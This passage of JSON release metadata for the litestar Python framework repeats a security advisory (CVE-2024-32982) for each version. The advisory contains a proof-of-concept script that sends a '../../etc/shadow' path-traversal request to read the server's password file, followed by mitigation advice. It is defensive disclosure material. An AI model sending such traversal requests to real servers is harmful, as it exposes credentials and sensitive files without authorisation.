expressions to validate file paths against a strict pattern that only matches expected and safe input.\n\n2. **Path Normalization:**\n   - Normalize file paths before using them in file operations. Functions such as `os.path.normpath()` in Python can be used to normalize paths. This method resolves redundant separators and up-level references (`../`) to prevent directory traversal.\n   - As a reference, consider the approach taken by the Starlette framework in their static file serving feature, where path validation is performed to ensure the requested path remains within the intended directory. For example, see how Starlette handles this with a security check:\n     ```python\n     if os.path.commonpath([full_path, directory]) != directory:\n         # Don't allow misbehaving clients to break out of the static files\n         # directory.\n         continue\n     ```\n     This snippet from [Starlette's implementation](https://github.com/encode/starlette/blob/master/starlette/staticfiles.py#L166) ensures that the constructed file path does not traverse out of the specified directory.\n\n\n## Comments\n**Naming Convention:**\n- From versions 0.X.X through 1.X.X, the package was released under the name \"starlite.\"\n- Starting with version 2.0.0 and for all subsequent versions, the package has been rebranded and released under the name \"litestar.\"\n\n**Feature Additions and Changes:**\n- Static Files Support: Introduced in version 0.6.0, adding the capability to serve static files directly from the package.\n- Path Validation Update: In version 1.37.0, Starlite modified its approach to validating paths within the static directory. Prior to this version, path validation was managed using the Starlette framework.","fixed_in":["2.8.3","2.7.2","2.6.4"],"id":"GHSA-83pv-qr33-2vcf","link":"https://osv.dev/vulnerability/GHSA-83pv-qr33-2vcf","source":"osv","summary":null,"withdrawn":null}]},"2.8.1":{"info":{"author":null,"author_email":"Cody Fincher <cody.fincher@gmail.com>, Jacob Coffee <jacob@z7x.org>, Janek Nouvertné <provinzkraut@posteo.de>, Na'aman Hirschfeld <nhirschfeld@gmail.com>, Peter Schutt <peter.github@proton.me>","bugtrack_url":null,"classifiers":["Development Status :: 5 - Production/Stable","Environment :: Web Environment","Intended Audience :: Developers","Intended Audience :: Information Technology","Intended Audience :: System Administrators","License :: OSI Approved :: MIT License","Natural Language :: English","Operating System :: OS Independent","Programming Language :: Python","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9","Topic :: Internet","Topic :: Internet :: WWW/HTTP","Topic :: Internet :: WWW/HTTP :: HTTP Servers","Topic :: Software Development","Topic :: Software Development :: Libraries","Topic :: Software Development :: Libraries :: Application Frameworks","Topic :: Software Development :: Libraries :: Python Modules","Typing :: Typed"],"description_content_type":"text/markdown","docs_url":null,"download_url":null,"downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":null,"keywords":"api, asgi, litestar, rest, starlite","license":"MIT","maintainer":null,"maintainer_email":"Litestar Developers <hello@litestar.dev>, Cody Fincher <cody@litestar.dev>, Jacob Coffee <jacob@litestar.dev>, Janek Nouvertné <provinzkraut@litestar.dev>, Peter Schutt <peter@litestar.dev>, Visakh Unnikrishnan <guacs@litestar.dev>, Alc <alc@litestar.dev>","name":"litestar","package_url":"https://pypi.org/project/litestar/","platform":null,"project_url":"https://pypi.org/project/litestar/","project_urls":{"Blog":"https://blog.litestar.dev","Changelog":"https://github.com/litestar-org/litestar/releases/","Discord":"https://discord.gg/litestar-919193495116337154","Documentation":"https://docs.litestar.dev/","Homepage":"https://litestar.dev/","Issue Tracker":"https://github.com/litestar-org/litestar/issues?q=is%3Aissue+is%3Aopen+sort%3Aupdated-desc","Reddit":"https://www.reddit.com/r/LitestarAPI","Repository":"https://github.com/litestar-org/litestar","Twitter":"https://twitter.com/LitestarAPI"},"provides_extra":null,"release_url":"https://pypi.org/project/litestar/2.8.1/","requires_dist":["anyio>=3","click","exceptiongroup; python_version < \"3.11\"","httpx>=0.22","importlib-metadata; python_version < \"3.10\"","importlib-resources>=5.12.0; python_version < \"3.9\"","msgspec>=0.18.2","multidict>=6.0.2","polyfactory>=2.6.3","pyyaml","rich-click","rich>=13.0.0","typing-extensions","annotated-types; extra == \"annotated-types\"","attrs; extra == \"attrs\"","brotli; extra == \"brotli\"","jsbeautifier; extra == \"cli\"","uvicorn[standard]; extra == \"cli\"","uvloop>=0.18.0; sys_platform != \"win32\" and extra == \"cli\"","cryptography; extra == \"cryptography\"","litestar[annotated-types,attrs,brotli,cli,cryptography,jinja,jwt,mako,minijinja,opentelemetry,piccolo,picologging,prometheus,pydantic,redis,sqlalchemy,standard,structlog]; extra == \"full\"","jinja2>=3.1.2; extra == \"jinja\"","cryptography; extra == \"jwt\"","python-jose; extra == \"jwt\"","mako>=1.2.4; extra == \"mako\"","minijinja>=1.0.0; extra == \"minijinja\"","opentelemetry-instrumentation-asgi; extra == \"opentelemetry\"","piccolo; extra == \"piccolo\"","picologging; extra == \"picologging\"","prometheus-client; extra == \"prometheus\"","email-validator; extra == \"pydantic\"","pydantic; extra == \"pydantic\"","pydantic-extra-types; extra == \"pydantic\"","redis[hiredis]>=4.4.4; extra == \"redis\"","advanced-alchemy<0.9.0,>=0.2.2; extra == \"sqlalchemy\"","fast-query-parsers>=1.0.2; extra == \"standard\"","jinja2; extra == \"standard\"","jsbeautifier; extra == \"standard\"","uvicorn[standard]; extra == \"standard\"","uvloop>=0.18.0; sys_platform != \"win32\" and extra == \"standard\"","structlog; extra == \"structlog\""],"requires_python":"<4.0,>=3.8","summary":"Litestar - A production-ready, highly performant, extensible ASGI API Framework","version":"2.8.1","yanked":false,"yanked_reason":null},"last_serial":25130260,"urls":[{"comment_text":"","digests":{"blake2b_256":"8684c7c96eab533732a6db1d8ac87cc907bf6518d9aad86cac77142f711de221","md5":"321b134d01dda8978e5be01d3602eb2d","sha256":"8a8d06ea04141ab38bb8c2db7567d535e019385aecf09e3ce89f7b588ce61705"},"downloads":-1,"filename":"litestar-2.8.1-py3-none-any.whl","has_sig":false,"md5_digest":"321b134d01dda8978e5be01d3602eb2d","packagetype":"bdist_wheel","python_version":"py3","requires_python":"<4.0,>=3.8","size":523023,"upload_time":"2024-04-08T11:26:39","upload_time_iso_8601":"2024-04-08T11:26:39.404213Z","url":"https://files.pythonhosted.org/packages/86/84/c7c96eab533732a6db1d8ac87cc907bf6518d9aad86cac77142f711de221/litestar-2.8.1-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"3b93a2064e3273b761ccd964804070b0bf87bb4a2d7b615d153d154957ee300c","md5":"642a2deb8c738f2c5f3e2935ae90a9d4","sha256":"2c94572a22b6fbf0aab0eb65cd53ab1cdd1e89c26c9842e579ca4097559e1134"},"downloads":-1,"filename":"litestar-2.8.1.tar.gz","has_sig":false,"md5_digest":"642a2deb8c738f2c5f3e2935ae90a9d4","packagetype":"sdist","python_version":"source","requires_python":"<4.0,>=3.8","size":678123,"upload_time":"2024-04-08T11:26:41","upload_time_iso_8601":"2024-04-08T11:26:41.685857Z","url":"https://files.pythonhosted.org/packages/3b/93/a2064e3273b761ccd964804070b0bf87bb4a2d7b615d153d154957ee300c/litestar-2.8.1.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2024-32982"],"details":"# Summary\n**Local File Inclusion via Path Traversal in LiteStar Static File Serving**\n\nA Local File Inclusion (LFI) vulnerability has been discovered in the static file serving component of [LiteStar](https://github.com/litestar-org/litestar). This vulnerability allows attackers to exploit path traversal flaws, enabling unauthorized access to sensitive files outside the designated directories. Such access can lead to the disclosure of sensitive information or potentially compromise the server.\n\n## Details\nThe vulnerability is located in the file path handling mechanism within the static content serving function, specifically at [line 70 in `litestar/static_files/base.py`](https://github.com/litestar-org/litestar/blob/main/litestar/static_files/base.py#L70).\n\nThe function fails to properly validate the destination file path derived from user input, thereby permitting directory traversal. The critical code segment is as follows:\n\n```python\ncommonpath([str(directory), file_info[\"name\"], joined_path])\n```\n\nGiven the variables:\n```python\ndirectory = PosixPath('/Users/brian/sandbox/test_vuln/static')\nfile_info[\"name\"] = '/Users/brian/sandbox/test_vuln/static/../requirements.txt'\njoined_path = PosixPath('/Users/brian/sandbox/test_vuln/static/../requirements.txt')\n```\n\nThe function outputs '/Users/brian/sandbox/test_vuln/static', incorrectly assuming it is confined to the static directory. This incorrect validation facilitates directory traversal, exposing the system to potential unauthorized access and manipulation.\n\n\n## Proof of Concept (PoC)\nTo reproduce this vulnerability, follow these steps:\n\n1. **Set up the environment:**\n   - Install with pip the `uvicorn` and `litestar` packages.\n   - Create a `static` folder in the root directory of your project and place any file (e.g., an image) in it for testing.\n   - Ensure the static file serving is enabled, which is typically the default configuration.\n\n2. **Preparation of the testing environment:**\n   - If using Ubuntu or a similar system, you can use `/etc/shadow` which contains sensitive password information. If not, create a dummy sensitive file outside the static directory for testing.\n   - Create a `main.py` file with the following content to configure and run the LiteStar server:\n\n    ```python\n    from pathlib import Path\n    from litestar import Litestar\n    from litestar.static_files import create_static_files_router\n    import uvicorn\n\n    app = Litestar(\n        route_handlers=[\n            create_static_files_router(path=\"/static\", directories=[\"static\"]),\n        ],\n    )\n\n    if __name__ == \"__main__\":\n        uvicorn.run(\"main:app\", host=\"0.0.0.0\", port=8000)\n    ```\n\n   - Run this script with the command `python3 main.py` to start the server.\n\n3. **Exploit:**\n   - Prepare an exploit script named `exploit.py` with the following Python code to perform the HTTP request without client-side sanitization:\n\n    ```python\n    import http.client\n\n    def send_request(host, port, path):\n        connection = http.client.HTTPConnection(host, port)\n        connection.request(\"GET\", path)\n        response = connection.getresponse()\n        print(f\"Status: {response.status}\")\n        print(f\"Headers: {response.getheaders()}\")\n        data = response.read()\n        print(f\"Body: {data.decode('utf-8')}\")\n        connection.close()\n\n    send_request(\"localhost\", 8000, \"/static/../../../../../../etc/shadow\")\n    ```\n\n   - Execute this script using `python3 exploit.py`. This script uses direct HTTP connections to bypass client-side path sanitization present in tools like curl or web browsers.\n\n4. **Observe:**\n   - The server should respond with the contents of the `/etc/shadow` file, thereby confirming the path traversal vulnerability.\n   - The output will display the status, headers, and body of the response, which should contain the contents of the sensitive file.\n\n\n## Impact\n\nThis Local File Inclusion vulnerability critically affects all instances of [LiteStar](https://github.com/litestar-org/litestar) where the server has been configured to serve static files. By exploiting this vulnerability, unauthorized attackers can gain read access to any file that the server process has permission to access. Here are the specific impacts:\n\n1. **Exposure of Sensitive Information:**\n   - The ability to traverse the file system can lead to the exposure of highly sensitive information. This includes system configuration files, application logs, or scripts containing credentials or cryptographic keys. Such information can provide attackers with deeper insights into the system architecture or facilitate further attacks.\n\n2. **Potential for System Compromise:**\n   - If sensitive system or application configuration files are exposed, attackers might be able to use this information to manipulate system behavior or escalate their privileges. For instance, accessing a `.env` file might reveal environment variables used for application configurations that include database passwords or API keys.\n\n3. **Credential Leakage:**\n   - Access to files such as `/etc/passwd` or `/etc/shadow` (on Unix-like systems) could expose user credentials, which might be leveraged to perform further attacks, such as brute force attacks on user accounts or using stolen credentials to access other systems where the same credentials are reused.\n\n4. **Regulatory and Compliance Violations:**\n   - Unauthorized access to personally identifiable information (PII), payment data, or health records could result in breaches of data protection regulations such as GDPR, HIPAA, or PCI DSS. This could not only damage the reputation of the organization but also lead to heavy fines and legal action.\n\n5. **Loss of Trust and Reputation Damage:**\n   - Security incidents, particularly those involving the loss of sensitive data, can significantly damage an organization's reputation. Customers and partners may lose trust, which can impact the business both immediately and in the long term.\n\n6. **Potential for Further Exploitation:**\n   - The initial read access gained through this vulnerability might be used as a stepping stone for more severe attacks. For example, if application source code is accessed, it could be analyzed for further vulnerabilities that might lead to direct exploitation, such as remote code execution.\n\n\n\nHere's the revised Mitigation Suggestion section for your vulnerability report, focusing on items 1 and 2, and including a reference to a similar implementation in another project:\n\n\n## Mitigation Suggestion\n\nTo effectively address the Local File Inclusion vulnerability via path traversal identified in the [LiteStar](https://github.com/litestar-org/litestar) application, it is essential to implement robust input validation and sanitization mechanisms. Below are specific strategies focused on managing user inputs and ensuring secure file path handling:\n\n1. **Input Validation and Sanitization:**\n   - Implement rigorous validation of all user-supplied input, particularly file path inputs. This should include sanitizing the input to remove or neutralize potentially harmful characters and sequences such as `../` which are used in path traversal attacks.\n   - Use regular expressions to validate file paths against a strict pattern that only matches expected and safe input.\n\n2. **Path Normalization:**\n   - Normalize file paths before using them in file operations. Functions such as `os.path.normpath()` in Python can be used to normalize paths. This method resolves redundant separators and up-level references (`../`) to prevent directory traversal.\n   - As a reference, consider the approach taken by the Starlette framework in their static file serving feature, where path validation is performed to ensure the requested path remains within the intended directory. For example, see how Starlette handles this with a security check:\n     ```python\n     if os.path.commonpath([full_path, directory]) != directory:\n         # Don't allow misbehaving clients to break out of the static files\n         # directory.\n         continue\n     ```\n     This snippet from [Starlette's implementation](https://github.com/encode/starlette/blob/master/starlette/staticfiles.py#L166) ensures that the constructed file path does not traverse out of the specified directory.\n\n\n## Comments\n**Naming Convention:**\n- From versions 0.X.X through 1.X.X, the package was released under the name \"starlite.\"\n- Starting with version 2.0.0 and for all subsequent versions, the package has been rebranded and released under the name \"litestar.\"\n\n**Feature Additions and Changes:**\n- Static Files Support: Introduced in version 0.6.0, adding the capability to serve static files directly from the package.\n- Path Validation Update: In version 1.37.0, Starlite modified its approach to validating paths within the static directory. Prior to this version, path validation was managed using the Starlette framework.","fixed_in":["2.8.3","2.7.2","2.6.4"],"id":"GHSA-83pv-qr33-2vcf","link":"https://osv.dev/vulnerability/GHSA-83pv-qr33-2vcf","source":"osv","summary":null,"withdrawn":null}]},"2.8.2":{"info":{"author":null,"author_email":"Cody Fincher <cody.fincher@gmail.com>, Jacob Coffee <jacob@z7x.org>, Janek Nouvertné <provinzkraut@posteo.de>, Na'aman Hirschfeld <nhirschfeld@gmail.com>, Peter Schutt <peter.github@proton.me>","bugtrack_url":null,"classifiers":["Development Status :: 5 - Production/Stable","Environment :: Web Environment","Intended Audience :: Developers","Intended Audience :: Information Technology","Intended Audience :: System Administrators","License :: OSI Approved :: MIT License","Natural Language :: English","Operating System :: OS Independent","Programming Language :: Python","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9","Topic :: Internet","Topic :: Internet :: WWW/HTTP","Topic :: Internet :: WWW/HTTP :: HTTP Servers","Topic :: Software Development","Topic :: Software Development :: Libraries","Topic :: Software Development :: Libraries :: Application Frameworks","Topic :: Software Development :: Libraries :: Python Modules","Typing :: Typed"],"description_content_type":"text/markdown","docs_url":null,"download_url":null,"downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":null,"keywords":"api, asgi, litestar, rest, starlite","license":"MIT","maintainer":null,"maintainer_email":"Litestar Developers <hello@litestar.dev>, Cody Fincher <cody@litestar.dev>, Jacob Coffee <jacob@litestar.dev>, Janek Nouvertné <provinzkraut@litestar.dev>, Peter Schutt <peter@litestar.dev>, Visakh Unnikrishnan <guacs@litestar.dev>, Alc <alc@litestar.dev>","name":"litestar","package_url":"https://pypi.org/project/litestar/","platform":null,"project_url":"https://pypi.org/project/litestar/","project_urls":{"Blog":"https://blog.litestar.dev","Changelog":"https://github.com/litestar-org/litestar/releases/","Discord":"https://discord.gg/litestar-919193495116337154","Documentation":"https://docs.litestar.dev/","Homepage":"https://litestar.dev/","Issue Tracker":"https://github.com/litestar-org/litestar/issues?q=is%3Aissue+is%3Aopen+sort%3Aupdated-desc","Reddit":"https://www.reddit.com/r/LitestarAPI","Repository":"https://github.com/litestar-org/litestar","Twitter":"https://twitter.com/LitestarAPI"},"provides_extra":null,"release_url":"https://pypi.org/project/litestar/2.8.2/","requires_dist":["anyio>=3","click","exceptiongroup; python_version < \"3.11\"","httpx>=0.22","importlib-metadata; python_version < \"3.10\"","importlib-resources>=5.12.0; python_version < \"3.9\"","msgspec>=0.18.2","multidict>=6.0.2","polyfactory>=2.6.3","pyyaml","rich-click","rich>=13.0.0","typing-extensions","annotated-types; extra == \"annotated-types\"","attrs; extra == \"attrs\"","brotli; extra == \"brotli\"","jsbeautifier; extra == \"cli\"","uvicorn[standard]; extra == \"cli\"","uvloop>=0.18.0; sys_platform != \"win32\" and extra == \"cli\"","cryptography; extra == \"cryptography\"","litestar[annotated-types,attrs,brotli,cli,cryptography,jinja,jwt,mako,minijinja,opentelemetry,piccolo,picologging,prometheus,pydantic,redis,sqlalchemy,standard,structlog]; extra == \"full\"","jinja2>=3.1.2; extra == \"jinja\"","cryptography; extra == \"jwt\"","python-jose; extra == \"jwt\"","mako>=1.2.4; extra == \"mako\"","minijinja>=1.0.0; extra == \"minijinja\"","opentelemetry-instrumentation-asgi; extra == \"opentelemetry\"","piccolo; extra == \"piccolo\"","picologging; extra == \"picologging\"","prometheus-client; extra == \"prometheus\"","email-validator; extra == \"pydantic\"","pydantic; extra == \"pydantic\"","pydantic-extra-types; extra == \"pydantic\"","redis[hiredis]>=4.4.4; extra == \"redis\"","advanced-alchemy<0.9.0,>=0.2.2; extra == \"sqlalchemy\"","fast-query-parsers>=1.0.2; extra == \"standard\"","jinja2; extra == \"standard\"","jsbeautifier; extra == \"standard\"","uvicorn[standard]; extra == \"standard\"","uvloop>=0.18.0; sys_platform != \"win32\" and extra == \"standard\"","structlog; extra == \"structlog\""],"requires_python":"<4.0,>=3.8","summary":"Litestar - A production-ready, highly performant, extensible ASGI API Framework","version":"2.8.2","yanked":false,"yanked_reason":null},"last_serial":25130260,"urls":[{"comment_text":"","digests":{"blake2b_256":"d552abe66a69e89edac9609f18c9f66e37bc11434e2ef7005a980952db0149a9","md5":"46ab921607ccb40d36e50710dc312e83","sha256":"c891baf8a17d66cfed5c40bef7b5bf4c02c2831babf5fca0af404f441610557a"},"downloads":-1,"filename":"litestar-2.8.2-py3-none-any.whl","has_sig":false,"md5_digest":"46ab921607ccb40d36e50710dc312e83","packagetype":"bdist_wheel","python_version":"py3","requires_python":"<4.0,>=3.8","size":523041,"upload_time":"2024-04-09T08:20:01","upload_time_iso_8601":"2024-04-09T08:20:01.040565Z","url":"https://files.pythonhosted.org/packages/d5/52/abe66a69e89edac9609f18c9f66e37bc11434e2ef7005a980952db0149a9/litestar-2.8.2-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"49c7e9b58aa7f8eea1a3b4ed9d11c5d2010be417b9d8edd93eee907cba4080d5","md5":"d0d9e55f1980aacaa49e642b77309119","sha256":"18353cb7246ba2e7f8d4aac4fe2d8772b503c931cf5ee16efc759cbbc3a2344b"},"downloads":-1,"filename":"litestar-2.8.2.tar.gz","has_sig":false,"md5_digest":"d0d9e55f1980aacaa49e642b77309119","packagetype":"sdist","python_version":"source","requires_python":"<4.0,>=3.8","size":678109,"upload_time":"2024-04-09T08:20:04","upload_time_iso_8601":"2024-04-09T08:20:04.467471Z","url":"https://files.pythonhosted.org/packages/49/c7/e9b58aa7f8eea1a3b4ed9d11c5d2010be417b9d8edd93eee907cba4080d5/litestar-2.8.2.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2024-32982"],"details":"# Summary\n**Local File Inclusion via Path Traversal in LiteStar Static File Serving**\n\nA Local File Inclusion (LFI) vulnerability has been discovered in the static file serving component of [LiteStar](https://github.com/litestar-org/litestar). This vulnerability allows attackers to exploit path traversal flaws, enabling unauthorized access to sensitive files outside the designated directories. Such access can lead to the disclosure of sensitive information or potentially compromise the server.\n\n## Details\nThe vulnerability is located in the file path handling mechanism within the static content serving function, specifically at [line 70 in `litestar/static_files/base.py`](https://github.com/litestar-org/litestar/blob/main/litestar/static_files/base.py#L70).\n\nThe function fails to properly validate the destination file path derived from user input, thereby permitting directory traversal. The critical code segment is as follows:\n\n```python\ncommonpath([str(directory), file_info[\"name\"], joined_path])\n```\n\nGiven the variables:\n```python\ndirectory = PosixPath('/Users/brian/sandbox/test_vuln/static')\nfile_info[\"name\"] = '/Users/brian/sandbox/test_vuln/static/../requirements.txt'\njoined_path = PosixPath('/Users/brian/sandbox/test_vuln/static/../requirements.txt')\n```\n\nThe function outputs '/Users/brian/sandbox/test_vuln/static', incorrectly assuming it is confined to the static directory. This incorrect validation facilitates directory traversal, exposing the system to potential unauthorized access and manipulation.\n\n\n## Proof of Concept (PoC)\nTo reproduce this vulnerability, follow these steps:\n\n1. **Set up the environment:**\n   - Install with pip the `uvicorn` and `litestar` packages.\n   - Create a `static` folder in the root directory of your project and place any file (e.g., an image) in it for testing.\n   - Ensure the static file serving is enabled, which is typically the default configuration.\n\n2. **Preparation of the testing environment:**\n   - If using Ubuntu or a similar system, you can use `/etc/shadow` which contains sensitive password information. If not, create a dummy sensitive file outside the static directory for testing.\n   - Create a `main.py` file with the following content to configure and run the LiteStar server:\n\n    ```python\n    from pathlib import Path\n    from litestar import Litestar\n    from litestar.static_files import create_static_files_router\n    import uvicorn\n\n    app = Litestar(\n        route_handlers=[\n            create_static_files_router(path=\"/static\", directories=[\"static\"]),\n        ],\n    )\n\n    if __name__ == \"__main__\":\n        uvicorn.run(\"main:app\", host=\"0.0.0.0\", port=8000)\n    ```\n\n   - Run this script with the command `python3 main.py` to start the server.\n\n3. **Exploit:**\n   - Prepare an exploit script named `exploit.py` with the following Python code to perform the HTTP request without client-side sanitization:\n\n    ```python\n    import http.client\n\n    def send_request(host, port, path):\n        connection = http.client.HTTPConnection(host, port)\n        connection.request(\"GET\", path)\n        response = connection.getresponse()\n        print(f\"Status: {response.status}\")\n        print(f\"Headers: {response.getheaders()}\")\n        data = response.read()\n        print(f\"Body: {data.decode('utf-8')}\")\n        connection.close()\n\n    send_request(\"localhost\", 8000, \"/static/../../../../../../etc/shadow\")\n    ```\n\n   - Execute this script using `python3 exploit.py`. This script uses direct HTTP connections to bypass client-side path sanitization present in tools like curl or web browsers.\n\n4. **Observe:**\n   - The server should respond with the contents of the `/etc/shadow` file, thereby confirming the path traversal vulnerability.\n   - The output will display the status, headers, and body of the response, which should contain the contents of the sensitive file.\n\n\n## Impact\n\nThis Local File Inclusion vulnerability critically affects all instances of [LiteStar](https://github.com/litestar-org/litestar) where the server has been configured to serve static files. By exploiting this vulnerability, unauthorized attackers can gain read access to any file that the server process has permission to access. Here are the specific impacts:\n\n1. **Exposure of Sensitive Information:**\n   - The ability to traverse the file system can lead to the exposure of highly sensitive information. This includes system configuration files, application logs, or scripts containing credentials or cryptographic keys. Such information can provide attackers with deeper insights into the system architecture or facilitate further attacks.\n\n2. **Potential for System Compromise:**\n   - If sensitive system or application configuration files are exposed, attackers might be able to use this information to manipulate system behavior or escalate their privileges. For instance, accessing a `.env` file might reveal environment variables used for application configurations that include database passwords or API keys.\n\n3. **Credential Leakage:**\n   - Access to files such as `/etc/passwd` or `/etc/shadow` (on Unix-like systems) could expose user credentials, which might be leveraged to perform further attacks, such as brute force attacks on user accounts or using stolen credentials to access other systems where the same credentials are reused.\n\n4. **Regulatory and Compliance Violations:**\n   - Unauthorized access to personally identifiable information (PII), payment data, or health records could result in breaches of data protection regulations such as GDPR, HIPAA, or PCI DSS. This could not only damage the reputation of the organization but also lead to heavy fines and legal action.\n\n5. **Loss of Trust and Reputation Damage:**\n   - Security incidents, particularly those involving the loss of sensitive data, can significantly damage an organization's reputation. Customers and partners may lose trust, which can impact the business both immediately and in the long term.\n\n6. **Potential for Further Exploitation:**\n   - The initial read access gained through this vulnerability might be used as a stepping stone for more severe attacks. For example, if application source code is accessed, it could be analyzed for further vulnerabilities that might lead to direct exploitation, such as remote code execution.\n\n\n\nHere's the revised Mitigation Suggestion section for your vulnerability report, focusing on items 1 and 2, and including a reference to a similar implementation in another project:\n\n\n## Mitigation Suggestion\n\nTo effectively address the Local File Inclusion vulnerability via path traversal identified in the [LiteStar](https://github.com/litestar-org/litestar) application, it is essential to implement robust input validation and sanitization mechanisms. Below are specific strategies focused on managing user inputs and ensuring secure file path handling:\n\n1. **Input Validation and Sanitization:**\n   - Implement rigorous validation of all user-supplied input, particularly file path inputs. This should include sanitizing the input to remove or neutralize potentially harmful characters and sequences such as `../` which are used in path traversal attacks.\n   - Use regular expressions to validate file paths against a strict pattern that only matches expected and safe input.\n\n2. **Path Normalization:**\n   - Normalize file paths before using them in file operations. Functions such as `os.path.normpath()` in Python can be used to normalize paths. This method resolves redundant separators and up-level references (`../`) to prevent directory traversal.\n   - As a reference, consider the approach taken by the Starlette framework in their static file serving feature, where path validation is performed to ensure the requested path remains within the intended directory. For example, see how Starlette handles this with a security check:\n     ```python\n     if os.path.commonpath([full_path, directory]) != directory:\n         # Don't allow misbehaving clients to break out of the static files\n         # directory.\n         continue\n     ```\n     This snippet from [Starlette's implementation](https://github.com/encode/starlette/blob/master/starlette/staticfiles.py#L166) ensures that the constructed file path does not traverse out of the specified directory.\n\n\n## Comments\n**Naming Convention:**\n- From versions 0.X.X through 1.X.X, the package was released under the name \"starlite.\"\n- Starting with version 2.0.0 and for all subsequent versions, the package has been rebranded and released under the name \"litestar.\"\n\n**Feature Additions and Changes:**\n- Static Files Support: Introduced in version 0.6.0, adding the capability to serve static files directly from the package.\n- Path Validation Update: In version 1.37.0, Starlite modified its approach to validating paths within the static directory. Prior to this version, path validation was managed using the Starlette framework.","fixed_in":["2.8.3","2.7.2","2.6.4"],"id":"GHSA-83pv-qr33-2vcf","link":"https://osv.dev/vulnerability/GHSA-83pv-qr33-2vcf","source":"osv","summary":null,"withdrawn":null}]},"2.8.3":{"info":{"author":null,"author_email":"Cody Fincher <cody.fincher@gmail.com>, Jacob Coffee <jacob@z7x.org>, Janek Nouvertné <provinzkraut@posteo.de>, Na'aman Hirschfeld <nhirschfeld@gmail.com>, Peter Schutt <peter.github@proton.me>","bugtrack_url":null,"classifiers":["Development Status :: 5 - Production/Stable","Environment :: Web Environment","Intended Audience :: Developers","Intended Audience :: Information Technology","Intended Audience :: System Administrators","License :: OSI Approved :: MIT License","Natural Language :: English","Operating System :: OS Independent","Programming Language :: Python","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9","Topic :: Internet","Topic :: Internet :: WWW/HTTP","Topic :: Internet :: WWW/HTTP :: HTTP Servers","Topic :: Software Development","Topic :: Software Development :: Libraries","Topic :: Software Development :: Libraries :: Application Frameworks","Topic :: Software Development :: Libraries :: Python Modules","Typing :: Typed"],"description_content_type":"text/markdown","docs_url":null,"download_url":null,"downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":null,"keywords":"api, asgi, litestar, rest, starlite","license":"MIT","maintainer":null,"maintainer_email":"Litestar Developers <hello@litestar.dev>, Cody Fincher <cody@litestar.dev>, Jacob Coffee <jacob@litestar.dev>, Janek Nouvertné <provinzkraut@litestar.dev>, Peter Schutt <peter@litestar.dev>, Visakh Unnikrishnan <guacs@litestar.dev>, Alc <alc@litestar.dev>","name":"litestar","package_url":"https://pypi.org/project/litestar/","platform":null,"project_url":"https://pypi.org/project/litestar/","project_urls":{"Blog":"https://blog.litestar.dev","Changelog":"https://github.com/litestar-org/litestar/releases/","Discord":"https://discord.gg/litestar","Documentation":"https://docs.litestar.dev/","Homepage":"https://litestar.dev/","Issue Tracker":"https://github.com/litestar-org/litestar/issues?q=is%3Aissue+is%3Aopen+sort%3Aupdated-desc","Reddit":"https://www.reddit.com/r/LitestarAPI","Repository":"https://github.com/litestar-org/litestar","Twitter":"https://twitter.com/LitestarAPI"},"provides_extra":null,"release_url":"https://pypi.org/project/litestar/2.8.3/","requires_dist":["anyio>=3","click","exceptiongroup; python_version < \"3.11\"","httpx>=0.22","importlib-metadata; python_version < \"3.10\"","importlib-resources>=5.12.0; python_version < \"3.9\"","msgspec>=0.18.2","multidict>=6.0.2","polyfactory>=2.6.3","pyyaml","rich-click","rich>=13.0.0","typing-extensions","annotated-types; extra == \"annotated-types\"","attrs; extra == \"attrs\"","brotli; extra == \"brotli\"","jsbeautifier; extra == \"cli\"","uvicorn[standard]; extra == \"cli\"","uvloop>=0.18.0; sys_platform != \"win32\" and extra == \"cli\"","cryptography; extra == \"cryptography\"","advanced-alchemy<0.9.0,>=0.2.2; extra == \"full\"","annotated-types; extra == \"full\"","attrs; extra == \"full\"","brotli; extra == \"full\"","cryptography; extra == \"full\"","email-validator; extra == \"full\"","fast-query-parsers>=1.0.2; extra == \"full\"","jinja2; extra == \"full\"","jinja2>=3.1.2; extra == \"full\"","jsbeautifier; extra == \"full\"","mako>=1.2.4; extra == \"full\"","minijinja>=1.0.0; extra == \"full\"","opentelemetry-instrumentation-asgi; extra == \"full\"","piccolo; extra == \"full\"","picologging; extra == \"full\"","prometheus-client; extra == \"full\"","pydantic; extra == \"full\"","pydantic-extra-types; extra == \"full\"","python-jose; extra == \"full\"","redis[hiredis]>=4.4.4; extra == \"full\"","structlog; extra == \"full\"","uvicorn[standard]; extra == \"full\"","uvloop>=0.18.0; sys_platform != \"win32\" and extra == \"full\"","jinja2>=3.1.2; extra == \"jinja\"","cryptography; extra == \"jwt\"","python-jose; extra == \"jwt\"","mako>=1.2.4; extra == \"mako\"","minijinja>=1.0.0; extra == \"minijinja\"","opentelemetry-instrumentation-asgi; extra == \"opentelemetry\"","piccolo; extra == \"piccolo\"","picologging; extra == \"picologging\"","prometheus-client; extra == \"prometheus\"","email-validator; extra == \"pydantic\"","pydantic; extra == \"pydantic\"","pydantic-extra-types; extra == \"pydantic\"","redis[hiredis]>=4.4.4; extra == \"redis\"","advanced-alchemy<0.9.0,>=0.2.2; extra == \"sqlalchemy\"","fast-query-parsers>=1.0.2; extra == \"standard\"","jinja2; extra == \"standard\"","jsbeautifier; extra == \"standard\"","uvicorn[standard]; extra == \"standard\"","uvloop>=0.18.0; sys_platform != \"win32\" and extra == \"standard\"","structlog; extra == \"structlog\""],"requires_python":"<4.0,>=3.8","summary":"Litestar - A production-ready, highly performant, extensible ASGI API 